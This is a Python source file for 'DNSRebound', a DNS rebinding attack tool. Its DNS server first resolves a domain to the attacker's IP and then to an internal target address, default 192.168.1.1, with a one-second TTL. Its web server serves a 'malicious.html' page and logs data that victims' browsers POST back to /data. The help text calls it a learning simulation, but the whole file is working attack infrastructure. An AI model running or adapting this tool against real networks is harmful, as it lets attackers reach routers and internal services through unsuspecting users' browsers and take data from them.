import argparse
import logging
import os
import sys
import time
from threading import Thread
from dnslib import *
from aiohttp import web
import asyncio
import socket

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    handlers=[
        logging.FileHandler('dnsrebound.log'),
        logging.StreamHandler(sys.stdout)
    ]
)

class DNSRebound:
    def __init__(self, interface, domain, public_ip, target_ip, dns_port=53, web_port=80, quiet=False):
        self.interface = interface
        self.domain = domain.strip('.')
        self.public_ip = public_ip
        self.target_ip = target_ip
        self.dns_port = dns_port
        self.web_port = web_port
        self.quiet = quiet
        self.dns_requests = 0
        self.output_file = f"dnsrebound_results_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        self.dns_running = False
        self.web_running = False

    def setup_interface(self):
        """Bind the interface for DNS and HTTP servers."""
        try:
            # Get interface IP if public_ip is not specified
            if not self.public_ip:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(('8.8.8.8', 80))
                self.public_ip = s.getsockname()[0]
                s.close()
            logging.info(f"Using public IP: {self.public_ip}")
        except Exception as e:
            logging.error(f"Error setting up interface: {str(e)}")
            sys.exit(1)

    async def handle_dns_request(self, request, writer):
        """Handle DNS queries, alternating between public and target IPs."""
        try:
            query = DNSRecord.parse(request)
            reply = query.reply()
            qname = str(query.q.qname).rstrip('.')
            if qname.endswith(self.domain):
                self.dns_requests += 1
                ip = self.target_ip if self.dns_requests > 1 else self.public_ip
                reply.add_answer(RR(
                    rname=qname,
                    rtype=QTYPE.A,
                    rclass=1,
                    ttl=1,
                    rdata=A(ip)
                ))
                logging.info(f"DNS: {qname} -> {ip} (Request #{self.dns_requests})")
            else:
                reply.add_answer(RR(
                    rname=qname,
                    rtype=QTYPE.A,
                    rclass=1,
                    ttl=1,
                    rdata=A('0.0.0.0')
                ))
                logging.info(f"DNS: {qname} -> 0.0.0.0 (Unknown domain)")
            writer.write(reply.pack())
        except Exception as e:
            logging.error(f"Error handling DNS request: {str(e)}")

    async def dns_server(self):
        """Run the DNS server."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind(('0.0.0.0', self.dns_port))
            self.dns_running = True
            logging.info(f"DNS server started on port {self.dns_port}")
            while self.dns_running:
                data, addr = await asyncio.get_event_loop().sock_recvfrom(sock, 1024)
                writer = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                writer.connect(addr)
                await self.handle_dns_request(data, writer)
                writer.close()
        except Exception as e:
            logging.error(f"DNS server error: {str(e)}")
        finally:
            sock.close()

    async def handle_web_request(self, request):
        """Handle HTTP requests, serving the malicious webpage or logging data."""
        try:
            if request.path == '/':
                with open('malicious.html', 'r') as f:
                    content = f.read()
                logging.info(f"Web: Served malicious.html to {request.remote}")
                return web.Response(text=content, content_type='text/html')
            elif request.path == '/data':
                data = await request.text()
                with open(self.output_file, 'a') as f:
                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Data from {request.remote}:\n{data}\n{'-'*50}\n")
                logging.info(f"Web: Received data from {request.remote}: {data}")
                return web.Response(text="Data received")
            else:
                logging.info(f"Web: 404 for {request.path} from {request.remote}")
                return web.Response(status=404)
        except Exception as e:
            logging.error(f"Web request error: {str(e)}")
            return web.Response(status=500)

    async def web_server(self):
        """Run the HTTP server."""
        try:
            app = web.Application()
            app.router.add_get('/', self.handle_web_request)
            app.router.add_post('/data', self.handle_web_request)
            runner = web.AppRunner(app)
            await runner.setup()
            site = web.TCPSite(runner, '0.0.0.0', self.web_port)
            await site.start()
            self.web_running = True
            logging.info(f"Web server started on port {self.web_port}")
            while self.web_running:
                await asyncio.sleep(1)
        except Exception as e:
            logging.error(f"Web server error: {str(e)}")
        finally:
            await runner.cleanup()

    def save_results(self):
        """Log final results."""
        try:
            with open(self.output_file, 'a') as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Total DNS requests: {self.dns_requests}\n")
            logging.info(f"Results saved to {self.output_file}")
        except Exception as e:
            logging.error(f"Error saving results: {str(e)}")

    def cleanup(self):
        """Clean up servers."""
        self.dns_running = False
        self.web_running = False
        logging.info("Cleaned up servers")

    def start(self):
        """Start the DNS rebinding attack."""
        logging.info(f"Starting DNSRebound: Domain={self.domain}, Public IP={self.public_ip}, Target IP={self.target_ip}")
        self.setup_interface()

        # Start DNS and web servers in the event loop
        loop = asyncio.get_event_loop()
        dns_task = loop.create_task(self.dns_server())
        web_task = loop.create_task(self.web_server())

        try:
            loop.run_forever()
        except KeyboardInterrupt:
            logging.info("DNSRebound stopped by user")
            self.save_results()
            self.cleanup()
            dns_task.cancel()
            web_task.cancel()
            loop.run_until_complete(loop.shutdown_asyncgens())
            loop.close()

def main():
    parser = argparse.ArgumentParser(description="DNSRebound - A tool to simulate DNS rebinding for learning.")
    parser.add_argument('-i', '--interface', required=True, help='Network interface (e.g., eth0)')
    parser.add_argument('-d', '--domain', required=True, help='Domain for rebinding (e.g., rebind.local)')
    parser.add_argument('-p', '--public-ip', default='', help='Public IP (default: auto-detected)')
    parser.add_argument('-t', '--target-ip', default='192.168.1.1', help='Target internal IP (default: 192.168.1.1)')
    parser.add_argument('--dns-port', default=53, type=int, help='DNS server port (default: 53)')
    parser.add_argument('--web-port', default=80, type=int, help='Web server port (default: 80)')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode (log to file only)')

    args = parser.parse_args()

    if args.quiet:
        logging.getLogger().handlers = [logging.FileHandler('dnsrebound.log')]

    rebound = DNSRebound(
        interface=args.interface,
        domain=args.domain,
        public_ip=args.public_ip,
        target_ip=args.target_ip,
        dns_port=args.dns_port,
        web_port=args.web_port,
        quiet=args.quiet
    )

    try:
        rebound.start()
    except KeyboardInterrupt:
        logging.info("DNSRebound stopped by user")
        rebound.cleanup()

if __name__ == "__main__":
    main()